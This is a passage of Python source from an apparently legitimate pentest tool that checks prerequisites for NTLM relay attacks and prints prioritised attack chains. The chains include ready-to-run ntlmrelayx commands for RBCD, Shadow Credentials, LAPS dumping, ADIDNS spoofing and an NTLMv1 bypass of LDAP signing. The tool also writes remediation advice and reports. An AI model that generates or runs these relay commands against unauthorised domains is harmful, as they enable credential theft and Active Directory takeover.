    addcomp_ar = _get_ar("Add Computer")
    if _viable(addcomp_ar):
        chains.append(AttackChain(
            tier="MEDIUM",
            title="LDAPS Add Computer Account",
            prereqs=f"LDAPS relay viable + MAQ > 0 on {dc_ip}",
            coerce_cmd=_http_coerce_cmd(),
            relay_cmd=(
                f"# Relay to LDAPS and create a machine account\n"
                f"  ntlmrelayx.py -t ldaps://{dc_ip} --add-computer\n"
                f"{_LDAP_RELAY_CRASH_HINT}"
            ),
            notes=(
                "Creates an attacker-controlled machine account. "
                "Use the new account as the delegation principal for RBCD or Shadow Creds."
                + " " + _ldap_relay_target_note()
            ),
        ))

    # ── 12. Cross-protocol: SMB → LDAP via NTLMv1 ─────────────────
    # When LDAP signing is enforced the standard LDAP chains above show
    # NOT VIABLE and never fire. But if NTLMv1 is accepted, ntlmrelayx can
    # strip the (absent) MIC and clear the SIGN/SEAL flags on the relayed
    # message, so SMB auth still relays to *plain* ldap:// even with
    # LdapServerIntegrity=2. Surface the LDAP-dependent chains via this path
    # when all three conditions hold:
    #   (a) NTLMv1 accepted on >=1 probed DC   (NtlmV1AuthProbeCheck PASS)
    #   (b) LDAP signing enforced              (LdapSigningCheck FAIL)
    #   (c) >=1 unsigned SMB host (coercion source) exists
    def _ntlmv1_accepted_ar() -> "AttackResult | None":
        # The probe is a shared check living in the rbcd/shadowcreds/laps
        # modules; any module's PASS result reflects the same per-DC probe.
        for frag in ("RBCD", "Shadow Credentials", "LAPS", "ADIDNS"):
            ar = _get_ar(frag)
            if _check_pass(ar, "NTLMv1 authentication accepted"):
                return ar
        return None

    _ntlmv1_ar = _ntlmv1_accepted_ar()
    smb_ar_xp = _get_ar("SMB")
    dc_u_xp, non_dc_u_xp = _extract_unsigned_hosts(smb_ar_xp)
    coercion_source = (non_dc_u_xp + dc_u_xp)  # prefer a member server as source

    if _ntlmv1_ar and coercion_source:
        # Extract the NTLMv1-accepting DC for the relay target; fall back to dc_ip.
        nv1_check = _get_check(_ntlmv1_ar, "NTLMv1 authentication accepted")
        ldap_dc = dc_ip
        if nv1_check and nv1_check.detail:
            m = re.search(r"ACCEPTED via:[^(]*\((\d{1,3}(?:\.\d{1,3}){3})\)", nv1_check.detail)
            if m:
                ldap_dc = m.group(1)
        src = coercion_source[0]
        src_label = f"{_hostname_map.get(src, src)} ({src})" if _hostname_map.get(src) else src
        nv1_note = (
            "NTLMv1 accepted — ntlmrelayx clears SIGN/SEAL on the relayed message "
            "(no MIC to invalidate), so SMB auth relays to plain ldap:// even though "
            "LDAP signing is enforced. Target ldap:// (NOT ldaps://) — the flag clearing "
            "only works on the unencrypted channel."
        )

        # Pull the concrete writable-object targets so the relay commands are
        # actionable, mirroring the standard chains above.
        _rbcd_t = _extract_writable_computers(_get_ar("RBCD"), "Writable computer")
        _sc_t = _extract_writable_computers(_get_ar("Shadow Credentials"), "Writable object")
        rbcd_target_xp = _rbcd_t[0] if _rbcd_t else "<target-computer>"
        sc_target_xp = _sc_t[0] if _sc_t else "<target-computer>"

        # Only surface a cross-protocol variant for a module whose *sole* blocker
        # is LDAP signing (i.e. it would be viable on the SMB→LDAP path).
        xp_specs = [
            ("RBCD", "Cross-Protocol RBCD (SMB→LDAP via NTLMv1)",
             "--delegate-access",
             "Relay writes msDS-AllowedToActOnBehalfOfOtherIdentity. "
             "Follow up: getST.py → pass-the-ticket → secretsdump."),
            ("Shadow Credentials", "Cross-Protocol Shadow Credentials (SMB→LDAP via NTLMv1)",
             f"--shadow-credentials --shadow-target {sc_target_xp}$",
             "Writes msDS-KeyCredentialLink → PKINIT TGT for the target machine account."),
            ("LAPS", "Cross-Protocol LAPS Dump (SMB→LDAP via NTLMv1)",
             "--dump-laps",
             "Dumps local Administrator passwords for LAPS-managed computers."),
            ("ADIDNS", "Cross-Protocol ADIDNS Spoofing (SMB→LDAP via NTLMv1)",
             f"--add-dns-record attacker {attacker} --no-dump --no-da --no-acl",
             "Relay creates a new DNS A record (dnsNode) pointing an attacker-chosen "
             f"hostname at the attacker ({attacker}); any client resolving it connects "
             "to you. A `wpad` record is especially high-value."),
        ]
        for frag, title, relay_flags, follow in xp_specs:
            ar = _get_ar(frag)
            if ar is None or not _ldap_signing_enforced(ar):
                continue
            # If the module is already viable (signing not actually enforced),
            # the standard chain above covers it — skip the cross-protocol variant.
            if _viable(ar):
                continue
            _tgt_note = ""
            if frag == "RBCD" and rbcd_target_xp != "<target-computer>":
                _tgt_note = f" + writable computer ({rbcd_target_xp})"
            elif frag == "Shadow Credentials" and sc_target_xp != "<target-computer>":
                _tgt_note = f" + writable object ({sc_target_xp})"
            chains.append(AttackChain(
                tier="HIGH",
                title=title,
                prereqs=(
                    f"NTLMv1 accepted (DC {ldap_dc}) + LDAP signing enforced "
                    f"+ unsigned SMB coercion source ({src_label}){_tgt_note}"
                ),
                coerce_cmd=_coerce_cmd(src),
                relay_cmd=(
                    f"# Relay SMB→LDAP over the unencrypted channel (NTLMv1 bypass)\n"
                    f"  ntlmrelayx.py -t ldap://{ldap_dc} {relay_flags}\n"
                    f"{_LDAP_RELAY_CRASH_HINT}"
                ),
                notes=f"{follow} {_ldap_relay_target_note()} {nv1_note}",
            ))

    # Sort by tier, then alphabetically within tier
    chains.sort(key=lambda c: (TIER_ORDER.get(c.tier, 99), c.title))
    return chains

def print_attack_paths(
    results: list[AttackResult],
    env_summary: dict,
    relay_target_summary: "RelayTargetSummary | None" = None,
) -> None:
    """Print the Recommended Attack Paths section to the terminal."""
    # Terminal output is the one place live creds are substituted (convenience);
    # file reports use the redacted default.
    chains = _build_attack_chains(results, env_summary, relay_target_summary,
                                  redact_creds=False)
    if not chains:
        return
    if RICH_AVAILABLE:
        _print_rich_attack_paths(chains)
    else:
        _print_plain_attack_paths(chains)


def _print_rich_attack_paths(chains: list[AttackChain]) -> None:
    console = Console()
    console.print()
    console.print(Panel.fit(
        "[bold white]Recommended Attack Paths[/]\n"
        "[dim]Prioritised chains based on viable prerequisites — commands use real values where available[/]",
        border_style="magenta",
    ))
    console.print()

    for i, chain in enumerate(chains, 1):
        tier_style, tier_label = TIER_STYLE.get(chain.tier, ("white", chain.tier))

        console.print(
            f"  [{tier_style}]{tier_label}[/]  [bold white]{chain.title}[/]"
        )
        console.print()

        first_coerce = True
        for line in chain.coerce_cmd.splitlines():
            if not line.strip():
                pass  # blank lines in source drive spacing via # detection
            elif line.strip().startswith("#"):
                if not first_coerce:
                    console.print()
                console.print(f"    [white]{line.strip()}[/]", highlight=False)
                first_coerce = False
            else:
                console.print(f"    [green]{line.strip()}[/]", highlight=False)
                first_coerce = False

        for line in (chain.relay_cmd or "").splitlines():
            if not line.strip():
                pass
            elif line.strip().startswith("#"):
                console.print()
                console.print(f"    [white]{line.strip()}[/]", highlight=False)
            else:
                console.print(f"    [cyan]{line.strip()}[/]", highlight=False)

        if chain.notes:
            console.print()
            console.print(f"  [dim]↳ {chain.notes}[/]", highlight=False)

        if i < len(chains):
            console.print()
            console.rule(style="dim")
            console.print()

    console.print()


def _print_plain_attack_paths(chains: list[AttackChain]) -> None:
    sep = "=" * 90
    print(f"\n{sep}")
    print("  RECOMMENDED ATTACK PATHS")
    print(sep)
    for i, chain in enumerate(chains, 1):
        print(f"\n  [{chain.tier}] {chain.title}")
        first_coerce = True
        for line in chain.coerce_cmd.splitlines():
            if not line.strip():
                pass
            elif line.strip().startswith("#"):
                if not first_coerce:
                    print()
                print(f"    {line.strip()}")
                first_coerce = False
            else:
                print(f"    {line.strip()}")
                first_coerce = False
        for line in (chain.relay_cmd or "").splitlines():
            if not line.strip():
                pass
            elif line.strip().startswith("#"):
                print()
                print(f"    {line.strip()}")
            else:
                print(f"    {line.strip()}")
        if chain.notes:
            print()
            print(f"  ↳ {chain.notes}")
        if i < len(chains):
            print(f"\n  {'-' * 86}")
    print()


def print_summary_table(results: list[AttackResult], verbose: bool = False,
                        quiet: bool = False) -> None:
    """Print the viability summary table only.

    Per-check verbose details are deliberately excluded here.  Call
    ``print_verbose_details()`` *after* ``print_attack_paths()`` so the
    Recommended Attack Paths section sits between the summary table and the
    detail dump.  The ``verbose`` parameter is accepted for backward-compat
    but ignored.

    When ``quiet=True`` NOT VIABLE and UNKNOWN rows are omitted from the table.  If this
    leaves nothing to display, a one-line suppression notice is printed instead
    of an empty table.
    """
    display = [r for r in results if r.viability not in _HIDDEN_IN_QUIET] if quiet else results
    suppressed = len(results) - len(display)
    if quiet and not display:
        try:
            from rich.console import Console as _C
            _C().print(f"\n[dim]No viable attack paths found. "
                       f"{suppressed} module(s) hidden (NOT VIABLE / UNKNOWN).[/]")
        except ImportError:
            print(f"\nNo viable attack paths found. "
                  f"{suppressed} module(s) hidden (NOT VIABLE / UNKNOWN).")
        return
    if RICH_AVAILABLE:
        _print_rich_summary_table(display, quiet=quiet, suppressed=suppressed)
    else:
        _print_plain_summary_table(display, quiet=quiet, suppressed=suppressed)


def print_verbose_details(results: list[AttackResult], verbose: bool = False,
                          quiet: bool = False) -> None:
    """Print per-check detail tables.  Always call *after* print_attack_paths().

    When ``quiet=True`` NOT VIABLE and UNKNOWN module blocks are omitted entirely.
    """
    if not verbose:
        if RICH_AVAILABLE:
            Console().print("\n[dim]Run with [bold]-v[/bold] for per-check details.[/]")
        else:
            print("\nRun with -v for per-check details.")
        return
    display = [r for r in results if r.viability not in _HIDDEN_IN_QUIET] if quiet else results
    if RICH_AVAILABLE:
        _print_rich_verbose_details(display, quiet=quiet)
    else:
        _print_plain_verbose_details(display, quiet=quiet)


def _print_rich_summary_table(results: list[AttackResult],
                              quiet: bool = False,
                              suppressed: int = 0) -> None:
    """Rich: viability summary table only."""
    console = Console()

    console.print()
    console.print(Panel.fit(
        "[bold white]NTLM Relay Prerequisite Checker[/]\n"
        "[dim]Attack viability summary[/]",
        border_style="blue",
    ))
    console.print()

    tbl = Table(
        box=box.ROUNDED,
        show_header=True,
        header_style="bold cyan",
        border_style="blue",
        expand=True,
    )
    tbl.add_column("Attack",               style="bold white", min_width=38)
    tbl.add_column("Viable?",              justify="center",   min_width=14)
    tbl.add_column("Failed Prerequisites",                     min_width=38)
    tbl.add_column("Warnings / Optional / Skipped",            min_width=30)

    for ar in results:
        style, label = VIABILITY_STYLE.get(ar.viability, ("dim", ar.viability))
        failed  = ", ".join(ar.missing) or "—"
        notices = []
        notices += ar.optional_failed
        notices += [c.name for c in ar.checks if c.status == Status.WARN]
        notices += ar.skipped
        notices_str = ", ".join(notices) or "—"
        tbl.add_row(
            ar.attack_name,
            Text(label, style=style),
            Text(failed,       style="red"    if ar.missing  else "dim"),
            Text(notices_str,  style="yellow" if notices     else "dim"),
        )

    console.print(tbl)
    if quiet and suppressed:
        console.print(f"[dim]({suppressed} NOT VIABLE / UNKNOWN module(s) hidden — "
                      f"run without -q to see all)[/]")


def _print_rich_verbose_details(results: list[AttackResult],
                                quiet: bool = False) -> None:
    """Rich: per-check detail table (shown after attack paths when -v is set)."""
    console = Console()

    console.print()
    console.print(Panel.fit(
        "[bold white]Per-Check Details[/]\n"
        "[dim]Full check output for all attack modules[/]"
        + (" [dim](NOT VIABLE / UNKNOWN modules hidden)[/]" if quiet else ""),
        border_style="blue",
    ))
    console.print()
    dtbl = Table(
        box=box.SIMPLE_HEAD,
        show_header=True,
        header_style="bold cyan",
        expand=True,
    )
    dtbl.add_column("Attack / Check", min_width=44, no_wrap=False)
    dtbl.add_column("Required",       justify="center", min_width=9, max_width=9)
    dtbl.add_column("Status",         justify="center", min_width=10, max_width=10)
    dtbl.add_column("Details",        min_width=40, no_wrap=False)

    for ar in results:
        style, label = VIABILITY_STYLE.get(ar.viability, ("dim", ar.viability))
        dtbl.add_row(
            f"[bold white]{ar.attack_name}[/]",
            "",
            Text(label, style=style),
            "",
        )
        for c in ar.checks:
            cstyle, clabel = STATUS_STYLE.get(c.status, ("dim", str(c.status)))
            req_label  = "[dim]opt[/dim]" if not c.required else ""
            # Guard: coerce detail to str in case a module accidentally returns
            # a tuple or other non-string value
            detail_str = c.detail if isinstance(c.detail, str) else str(c.detail)
            dtbl.add_row(
                f"  {c.name}",
                req_label,
                Text(clabel, style=cstyle),
                detail_str,
            )
        dtbl.add_row("", "", "", "")

    console.print(dtbl)


def _print_plain_summary_table(results: list[AttackResult],
                               quiet: bool = False,
                               suppressed: int = 0) -> None:
    """Plain-text: viability summary table only."""
    sep = "=" * 80
    print(f"\n{sep}")
    print("  NTLM RELAY PREREQUISITE CHECKER — SUMMARY")
    print(sep)
    print(f"{'Attack':<42} {'Viable?':<14} {'Failed Prerequisites'}")
    print("-" * 80)

    for ar in results:
        _, label = VIABILITY_STYLE.get(ar.viability, ("", ar.viability))
        label  = label.replace("✅ ", "").replace("⚠️  ", "").replace("❌ ", "").replace("❓ ", "")
        failed = ", ".join(ar.missing) or "none"
        notices = ar.optional_failed + [c.name for c in ar.checks if c.status == Status.WARN] + ar.skipped
        notices_str = ", ".join(notices) or "none"
        print(f"{ar.attack_name:<42} {label:<14} {failed}")
        if notices:
            print(f"  {'':42} {'':14} Warnings/Optional/Skipped: {notices_str}")

    if quiet and suppressed:
        print(f"\n({suppressed} NOT VIABLE / UNKNOWN module(s) hidden — run without -q to see all)")
    print()


def _print_plain_verbose_details(results: list[AttackResult],
                                 quiet: bool = False) -> None:
    """Plain-text: per-check detail dump."""
    if quiet:
        print("\n--- Per-Check Details (NOT VIABLE / UNKNOWN modules hidden) ---")
    for ar in results:
        print(f"\n{'─'*80}\n{ar.attack_name}")
        for c in ar.checks:
            req = "" if c.required else " [opt]"
            print(f"  [{STATUS_PLAIN[c.status]}]{req:<8}  {c.name}")
            print(f"             {c.detail if isinstance(c.detail, str) else str(c.detail)}")
    print()


# ── Relay target finder summary ────────────────────────────────────────────

def print_relay_target_summary(summary: RelayTargetSummary) -> None:
    """Print the relay target finder results to the terminal."""
    if RICH_AVAILABLE:
        _print_rich_relay_targets(summary)
    else:
        _print_plain_relay_targets(summary)


def _print_rich_relay_targets(summary: RelayTargetSummary) -> None:
    console = Console()

    console.print()
    console.print(Panel.fit(
        "[bold white]Coercion Target Candidates[/]\n"
        "[dim]Accounts with ACL rights that make them valuable coercion targets[/]",
        border_style="cyan",
    ))
    console.print()

    if summary.skipped:
        console.print(f"[yellow]⚠ Skipped:[/] {summary.skipped}\n")
        return
    if summary.error:
        console.print(f"[red]✗ Error:[/] {summary.error}\n")
        return
    if not summary.entries:
        console.print("[dim]No relay-worthy ACL paths found with the enumeration credential.[/]\n")
        return

    ATTACK_STYLE = {
        "RBCD":        "cyan",
        "ShadowCreds": "magenta",
        "LAPS":        "yellow",
        "ACLAbuse":    "red",
    }

    tbl = Table(
        box=box.ROUNDED,
        show_header=True,
        header_style="bold cyan",
        border_style="cyan",
        expand=True,
    )
    tbl.add_column("Account",       style="bold white", min_width=22)
    tbl.add_column("Attack",        justify="center",   min_width=13)
    tbl.add_column("Target Object", min_width=24)
    tbl.add_column("Right",         min_width=30)

    by_account = summary.by_account
    for account in sorted(by_account):
        first = True
        for entry in sorted(by_account[account], key=lambda e: (e.attack, e.target_object)):
            style = ATTACK_STYLE.get(entry.attack, "white")
            tbl.add_row(
                account if first else "",
                Text(entry.attack, style=style),
                entry.target_object,
                entry.right,
            )
            first = False

    console.print(tbl)
    console.print(
        f"[dim]Found {len(summary.entries)} ACL path(s) across "
        f"{len(summary.by_account)} account(s). "
        "Coerce any listed account and relay to the indicated attack.[/]\n"
    )


def _print_plain_relay_targets(summary: RelayTargetSummary) -> None:
    sep = "=" * 90
    print(f"\n{sep}")
    print("  COERCION TARGET CANDIDATES")
    print(sep)

    if summary.skipped:
        print(f"[SKIP] {summary.skipped}")
        print()
        return
    if summary.error:
        print(f"[ERR]  {summary.error}")
        print()
        return
    if not summary.entries:
        print("No relay-worthy ACL paths found.")
        print()
        return

    print(f"{'Account':<24} {'Attack':<13} {'Target Object':<26} Right")
    print("-" * 90)
    for entry in sorted(summary.entries, key=lambda e: (e.account, e.attack)):
        print(f"{entry.account:<24} {entry.attack:<13} {entry.target_object:<26} {entry.right}")
    print()


# ── Markdown report ────────────────────────────────────────────────────────

def write_markdown_report(
    results: list[AttackResult],
    env_summary: dict,
    output_path: str,
    relay_target_summary: RelayTargetSummary | None = None,
) -> None:
    """Write a full Markdown report suitable for inclusion in a pentest report."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines: list[str] = []

    a = lines.append

    a("# NTLM Relay Prerequisite Check Report")
    a("")
    a(f"**Generated:** {now}  ")
    a(f"**Domain:** `{env_summary.get('domain', 'N/A')}`  ")
    a(f"**DC IP:** `{env_summary.get('dc_ip', 'N/A')}`  ")
    if env_summary.get("extra_targets"):
        a(f"**Extra Targets:** `{', '.join(env_summary['extra_targets'])}`  ")
    a(f"**Credentials:** `{env_summary.get('user', 'N/A')}` (low-privilege domain user)  ")
    a("")
    a("---")
    a("")

    # ── Scope notes (ROE / discovered-DC probing) ──────────────────
    _scope_notes = env_summary.get("scope_notes") or []
    if _scope_notes:
        a("## Scope Notes")
        a("")
        for _sn in _scope_notes:
            a(f"> {_sn}")
            a("")
        a("---")
        a("")

    # ── Executive summary table ────────────────────────────────────
    a("## Executive Summary")
    a("")
    a("| Attack | Viability | Failed Prerequisites | Warnings / Optional / Skipped |")
    a("|--------|-----------|----------------------|-------------------------------|")

    for ar in results:
        _, label = VIABILITY_STYLE.get(ar.viability, ("", ar.viability))
        # Markdown-friendly symbols
        md_label = (
            label
            .replace("✅ ", "✅ ")
            .replace("⚠️  ", "⚠️ ")
            .replace("❌ ", "❌ ")
            .replace("❓ ", "❓ ")
        )
        failed = ", ".join(f"`{m}`" for m in ar.missing) or "—"
        notices = (
            [f"`{n}` *(optional fail)*" for n in ar.optional_failed]
            + [f"`{c.name}` *(warn)*" for c in ar.checks if c.status == Status.WARN]
            + [f"`{s}` *(skipped)*" for s in ar.skipped]
        )
        notices_str = ", ".join(notices) or "—"
        a(f"| {ar.attack_name} | {md_label} | {failed} | {notices_str} |")

    a("")
    a("---")
    a("")

    # ── Recommended Attack Paths ───────────────────────────────────
    chains = _build_attack_chains(results, env_summary, relay_target_summary)
    if chains:
        a("## Recommended Attack Paths")
        a("")
        a("Prioritised chains based on viable prerequisites. "
          "Commands use real values where available.")
        a("")

        TIER_MD = {"CRITICAL": "🔴 CRITICAL", "HIGH": "🟠 HIGH", "MEDIUM": "🔵 MEDIUM"}

        for chain in chains:
            tier_label = TIER_MD.get(chain.tier, chain.tier)
            a(f"### {tier_label} — {chain.title}")
            a("")
            a(f"**Prerequisites:** {chain.prereqs}  ")
            if chain.notes:
                a(f"**Notes:** {chain.notes}  ")
            a("")
            a("```bash")
            a("# Coerce")
            for line in chain.coerce_cmd.splitlines():
                a(line)
            a("")
            a("# Relay")
            if chain.relay_cmd:
                a(chain.relay_cmd)
            a("```")
            a("")

        a("---")
        a("")

    # ── Per-attack detail ──────────────────────────────────────────
    a("## Detailed Findings")
    a("")

    for ar in results:
        _, label = VIABILITY_STYLE.get(ar.viability, ("", ar.viability))
        a(f"### {ar.attack_name}")
        a("")
        a(f"**Viability:** {label}  ")
        if ar.missing:
            a(f"**Missing prerequisites:** {', '.join(f'`{m}`' for m in ar.missing)}  ")
        if ar.skipped:
            a(f"**Checks skipped:** {', '.join(f'`{s}`' for s in ar.skipped)}  ")
        a("")
        a("| Check | Required | Status | Detail |")
        a("|-------|----------|--------|--------|")

        for c in ar.checks:
            req   = "Required" if c.required else "Optional"
            plain = STATUS_PLAIN[c.status]
            # Escape pipe chars in detail
            detail_clean = (c.detail if isinstance(c.detail, str) else str(c.detail)).replace("|", "\\|").replace("\n", " ")
            a(f"| {c.name} | {req} | {plain} | {detail_clean} |")

        a("")

    # ── Coercion target candidates ─────────────────────────────────
    if relay_target_summary is not None:
        a("---")
        a("")
        a("## Coercion Target Candidates")
        a("")
        if relay_target_summary.skipped:
            a(f"> ⚠ Skipped: {relay_target_summary.skipped}")
        elif relay_target_summary.error:
            a(f"> ✗ Error: {relay_target_summary.error}")
        elif not relay_target_summary.entries:
            a("No relay-worthy ACL paths found with the enumeration credential.")
        else:
            a("Accounts with ACL rights that make them valuable coercion targets. "
              "Coerce any listed account and relay its authentication to the indicated attack.")
            a("")
            a("| Account | Attack | Target Object | Right |")
            a("|---------|--------|---------------|-------|")
            for entry in sorted(
                relay_target_summary.entries,
                key=lambda e: (e.account, e.attack, e.target_object),
            ):
                a(f"| `{entry.account}` | {entry.attack} | {entry.target_object} | `{entry.right}` |")
        a("")

    # ── Remediation notes ──────────────────────────────────────────
    a("---")
    a("")
    a("## Remediation Recommendations")
    a("")
    a("| Finding | Recommendation |")
    a("|---------|----------------|")

    recs = _build_remediation(results)
    for finding, rec in recs:
        a(f"| {finding} | {rec} |")

    a("")
    a("---")
    a("*Report generated by RelayHound. "
      "Manual verification recommended for WARN/SKIP findings.*")

    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))


def _build_remediation(results: list[AttackResult]) -> list[tuple[str, str]]:
    """
    Generate remediation recommendations based on PASS checks only.
    A PASS means the attacker-side prerequisite IS met — i.e. a real vulnerability
    exists that the defender should remediate. FAIL means the prereq is missing
    (attacker can't exploit), so no remediation needed from defender's perspective.
    """
    recs: list[tuple[str, str]] = []
    seen: set[str] = set()

    # Map check name keywords → defender remediation advice.
    # These only fire when the check PASSes (vulnerability confirmed).
    remediations = {
        "smb signing disabled":      "Enable SMB signing via GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options: `Microsoft network server: Digitally sign communications (always)` = Enabled",
        "ntlm authentication":       "Consider restricting NTLM via GPO: Network Security: Restrict NTLM. Deploy Kerberos-only authentication where possible.",
        "ldap signing not enforced": "Set LdapServerIntegrity = 2 via GPO: Domain Controller: LDAP server signing requirements = Require signing",
        "ldap channel binding":      "Enable LDAP channel binding via GPO: Domain Controller: LDAP server channel binding token requirements = Always",
        "web enrollment http":       "Disable HTTP enrollment on the CA web server; enforce HTTPS only. Enable Extended Protection for Authentication (EPA) on IIS.",
        "certsrv uses ntlm":         "Enable EPA on the IIS certsrv application. Consider disabling web enrollment if not required.",
        "webclient service":         "Disable the WebClient service via GPO to prevent WebDAV-based NTLM coercion: Computer Configuration → Preferences → Control Panel Settings → Services → WebClient = Disabled",
        "machineaccountquota":       "Set ms-DS-MachineAccountQuota = 0 on the domain root to prevent unprivileged users from creating machine accounts.",
        "mssql port reachable":      "Restrict MSSQL access via firewall rules. Disable xp_cmdshell. Enforce Kerberos authentication. Apply least-privilege SQL account permissions.",
        "mssql accepts windows":     "Enforce Kerberos-only authentication for SQL Server where possible. Review SQL Server login audit settings.",
        "null/guest session":        "Disable null session access: Network access: Do not allow anonymous enumeration of SAM accounts and shares = Enabled",
    }

    for ar in results:
        for c in ar.checks:
            # Only remediate confirmed vulnerabilities (PASS/WARN on viable attacks)
            if c.status not in (Status.PASS, Status.WARN):
                continue
            # Skip if the overall attack is not viable — a PASS on a sub-check
            # in a NOT VIABLE attack doesn't mean that specific vector is
            # exploitable. UNKNOWN (nothing testable) is likewise not actionable.
            if ar.viability in ("NOT VIABLE", "UNKNOWN"):
                continue
            for keyword, rec in remediations.items():
                if keyword in c.name.lower() and keyword not in seen:
                    recs.append((c.name, rec))
                    seen.add(keyword)

    if not recs:
        if any(ar.viability == "UNKNOWN" for ar in results):
            recs.append((
                "Could not fully assess",
                "One or more attack paths could not be evaluated (target "
                "unreachable, credentials rejected, or required tooling absent) — "
                "see the UNKNOWN module(s) above. This is NOT a clean bill of "
                "health; resolve the gaps and re-run before concluding the "
                "environment is hardened.",
            ))
        else:
            recs.append((
                "No exploitable findings",
                "No viable attack prerequisites confirmed. Environment appears "
                "hardened against the checked attack vectors.",
            ))

    return recs



# ── JSON report ────────────────────────────────────────────────────────────

def write_json_report(
    results: list[AttackResult],
    env_summary: dict,
    output_path: str,
    relay_target_summary: RelayTargetSummary | None = None,
) -> None:
    """Write a machine-readable JSON report."""
    import json
    from datetime import datetime

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    data: dict = {
        "generated": now,
        "domain":    env_summary.get("domain", ""),
        "dc_ip":     env_summary.get("dc_ip", ""),
        "user":      env_summary.get("user", ""),
        "extra_targets": env_summary.get("extra_targets", []),
        "dc_ip_only":    bool(env_summary.get("dc_ip_only", False)),
        "scope_notes":   env_summary.get("scope_notes", []),
        "results": [],
    }

    for ar in results:
        data["results"].append({
            "attack":     ar.attack_name,
            "viability":  ar.viability,
            "missing":    ar.missing,
            "skipped":    ar.skipped,
            "checks": [
                {
                    "name":     c.name,
                    "status":   str(c.status),
                    "required": c.required,
                    "detail":   c.detail if isinstance(c.detail, str) else str(c.detail),
                }
                for c in ar.checks
            ],
        })

    if relay_target_summary and relay_target_summary.entries:
        data["relay_targets"] = [
            {
                "account":       e.account,
                "attack":        e.attack,
                "target_object": e.target_object,
                "right":         e.right,
            }
            for e in relay_target_summary.entries
        ]

    chains = _build_attack_chains(results, env_summary)
    if chains:
        data["attack_paths"] = [
            {
                "tier":     c.tier,
                "title":    c.title,
                "prereqs":  c.prereqs,
                "coerce":   c.coerce_cmd,
                "relay":    c.relay_cmd or "",
                "notes":    c.notes or "",
            }
            for c in chains
        ]

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


# ── SMB relay target list ──────────────────────────────────────────────────

def write_relay_list(results: list[AttackResult], output_path: str) -> int:
    """
    Write a list of SMB-unsigned hosts suitable for use with ntlmrelayx -tf.
    Parses the raw field of the SMB signing check to extract unsigned hosts.
    Returns the number of hosts written.
    """
    unsigned: list[str] = []

    for ar in results:
        if ar.attack_name != "NTLM Relay → SMB (secretsdump)":
            continue
        for c in ar.checks:
            if c.name == "SMB signing disabled on ≥1 target" and c.raw:
                # raw format: "Signed: [...] | Unsigned: [...]"
                import re
                m = re.search(r"Unsigned:\s*\[([^\]]*)\]", c.raw)
                if m:
                    for host in m.group(1).split(","):
                        host = host.strip().strip(" '")
                        if host:
                            unsigned.append(host)

    if unsigned:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write("\n".join(unsigned) + "\n")

    return len(unsigned)


def write_laps_scope(results: list[AttackResult], output_path: str) -> int:
    """
    Write a list of LAPS-managed computer hostnames suitable for targeting
    with ntlmrelayx --laps or a manual LDAP password dump.

    Parses the raw field of LapsManagedComputersCheck (populated by the LAPS
    module as a newline-separated list of sAMAccountNames).

    Returns the number of computers written.
    """
    computers: list[str] = []

    for ar in results:
        if ar.attack_name != "NTLM Relay → LDAP (LAPS Password Dump)":
            continue
        for c in ar.checks:
            if c.name == "LAPS-managed computers in scope (optional scope check)" and c.raw:
                for line in c.raw.splitlines():
                    host = line.strip()
                    if host:
                        computers.append(host)
                break  # only one such check exists

    if computers:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write("\n".join(computers) + "\n")

    return len(computers)



# ── Progress display ───────────────────────────────────────────────────────

class CheckProgress:
    """Live progress display for checks as they run.

    Sequential runs report progress per module via three lifecycle hooks —
    ``module_started`` / ``update`` / ``module_finished`` — with the
    presentation depending on the terminal capabilities:

      * rich, non-verbose: a single live spinner per module
        ("Module X/Y: <name>... (N checks)"), replaced by a one-line
        viability verdict when the module finishes. Per-check output is
        buffered (the spinner only shows a running count) so the spinner and
        ``print()`` never interleave.
      * rich, verbose: a "▶ Module X/Y: <name>" header, then one streamed
        line per check as results arrive (unchanged in substance from before).
      * plain (no rich): "[X/Y] <name>... <verdict>" on one line, with a dot
        per check in non-verbose mode.

    Quiet mode (``quiet=True``, from ``-q``) suppresses NOT VIABLE modules from
    the *live* non-verbose display, mirroring how ``-q`` already drops them from
    the final summary table. In rich non-verbose the spinner still shows for
    every module (live feedback), but a NOT VIABLE module's spinner is simply
    erased with no verdict line left behind. In plain non-verbose the per-module
    line is deferred until the verdict is known and only emitted for non-NOT
    VIABLE modules. Quiet does not alter verbose live output (per-check lines are
    already streamed by the time the verdict is known); ``-q`` continues to
    filter the final verbose detail section instead.

    Parallel runs can't show a spinner per module (they all run at once), so
    ``parallel_start`` prints a single "running N modules in parallel" banner
    and the module lifecycle hooks are no-ops; the summary table that follows
    carries the per-module verdicts (already quiet-filtered). In parallel
    verbose mode the per-check lines still stream (interleaved), as before.
    """

    def __init__(self, verbose: bool = False, module_total: int = 0,
                 parallel: bool = False, quiet: bool = False):
        self.verbose = verbose
        self.module_total = module_total
        self.parallel = parallel
        self.quiet = quiet
        self._console = Console(stderr=True) if RICH_AVAILABLE else None
        self._current_attack = ""
        self._module_prefix = ""      # "Module X/Y" for the active module
        self._idx = 0                 # active module's 1-based index
        self._total = 0               # total module count
        self._check_count = 0
        self._live = None             # rich.live.Live while a module runs
        self._spinner = None          # rich.spinner.Spinner inside the Live
        self._parallel_done = 0       # modules completed so far in a parallel run

    # ── parallel banner + live counter ────────────────────────────
    def parallel_start(self, total: int) -> None:
        """Start a live 'X/N done' counter for a parallel run.

        In verbose mode the per-check lines stream to the same console, so a
        Live spinner would corrupt them. In that case print a static banner
        and leave the streaming lines to speak for themselves.
        """
        self._total = total
        self._parallel_done = 0
        if RICH_AVAILABLE:
            if self.verbose:
                # Static banner only — Live + streaming Console.print don't mix.
                self._console.print(
                    f"[dim]Running [cyan]{total}[/] modules in parallel...[/]",
                    highlight=False,
                )
            else:
                from rich.live import Live
                from rich.spinner import Spinner
                self._spinner = Spinner(
                    "dots",
                    text=f"[dim]Running [cyan]{total}[/] modules in parallel... "
                         f"[dim](0/{total} done)[/]",
                )
                self._live = Live(self._spinner, console=self._console,
                                  transient=False, refresh_per_second=12)
                self._live.start()
        else:
            print(f"[*] Running {total} modules in parallel... ", end="", flush=True)

    def parallel_module_finished(self, attack_name: str, ar) -> None:
